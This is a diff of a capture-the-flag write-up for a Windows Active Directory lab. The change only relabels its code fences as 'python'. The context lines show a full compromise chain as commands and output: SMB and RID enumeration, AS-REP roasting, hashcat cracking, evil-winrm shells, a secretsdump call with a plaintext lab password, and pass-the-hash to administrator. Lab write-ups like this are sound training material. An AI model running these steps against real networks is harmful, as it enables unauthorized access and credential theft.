@@ -16,7 +16,7 @@ export IP=10.10.170.121
 nmap -A -sV -p- -oN nmap.txt $IP
 ````````
 
-````````
+````````python
 PORT      STATE SERVICE       REASON          VERSION
 88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2022-03-11 13:31:40Z)
 135/tcp   open  msrpc?        syn-ack ttl 127
@@ -98,7 +98,7 @@ Nmap done: 1 IP address (1 host up) scanned in 192.81 seconds
 smbclient  -L ////$IP//
 ````````
 
-````````
+````````python
 Sharename       Type      Comment
 	---------       ----      -------
 	ADMIN$          Disk      Remote Admin
@@ -125,7 +125,7 @@ We have Read Only IPC$. So we can enumerate the username. I will use Crack Map E
 poetry run crackmapexec smb  $IP -u 'guest' -p '' --rid-brute
 ````````
 
-````````
+````````python
 SMB         10.10.170.121   445    WIN-2BO8M1OE1M1  [*] Windows 10.0 Build 17763 x64 (name:WIN-2BO8M1OE1M1) (domain:vulnnet-rst.local) (signing:True) (SMBv1:False)
 SMB         10.10.170.121   445    WIN-2BO8M1OE1M1  [+] vulnnet-rst.local\guest: 
 SMB         10.10.170.121   445    WIN-2BO8M1OE1M1  [+] Brute forcing RIDs
@@ -182,7 +182,7 @@ j-leet
 GetNPUsers.py vulnnet-rst.local/ -no-pass -usersfile users.txt
 ````````
 
-````````
+````````python
 Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation
 
 [-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
@@ -207,7 +207,7 @@ we can use the name-the-hash tool by own bee-san!
 nth --file hash.txt
 ````````
 
-````````
+````````python
   _   _                           _____ _           _          _   _           _     
  | \ | |                         |_   _| |         | |        | | | |         | |    
  |  \| | __ _ _ __ ___   ___ ______| | | |__   __ _| |_ ______| |_| | __ _ ___| |__  
@@ -232,7 +232,7 @@ Kerberos 5 AS-REP etype 23, HC: 18200 JtR: krb5pa-sha1 Summary: Used for Windows
  hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt --force
 ````````
 
- ```````
+ ```````python
  hashcat (v6.2.5) starting
 
 You have enabled --force to bypass dangerous warnings and errors!
@@ -305,7 +305,7 @@ I tried to log in with evil-winrm but it does not work because these credentials
 smbclient   //$IP/NETLOGON -U t-skid 
 ````````
 
-````````
+````````python
 Try "help" to get a list of possible commands.
 smb: \> ls
   .                                   D        0  Wed Mar 17 04:45:49 2021
@@ -327,7 +327,7 @@ smb: \>
 cat ResetPassword.vbs 
 ````````
 
-````````
+````````python
 Option Explicit
 
 Dim objRootDSE, strDNSDomain, objTrans, strNetBIOSDomain
@@ -419,7 +419,7 @@ Wscript.Echo "and password expired for user " & strUserNTName
 evil-winrm -u 'a-whitehat' -p '**************' -i $IP 
 ````````
 
-````````
+````````python
 Evil-WinRM shell v3.3
 
 Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
@@ -456,7 +456,7 @@ THM{***************************}
 secretsdump.py vulnnet-rst.local/a-whitehat:bNdKVkjv3RR9ht@10.10.41.27
 ````````
 
-````````
+````````python
 [*] Target system bootKey: 0xf10a2788aef5f622149a41b2c745f49a
 [*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
 Administrator:500:aad3b435b51404eeaad3b435b51404ee:{REDACTED}:::
@@ -472,7 +472,7 @@ DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:{REDACTED}:::
 evil-winrm -u administrator -H ******************************** -i $IP
 ````````
 
-````````
+````````python
 Evil-WinRM shell v3.3
 
 Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
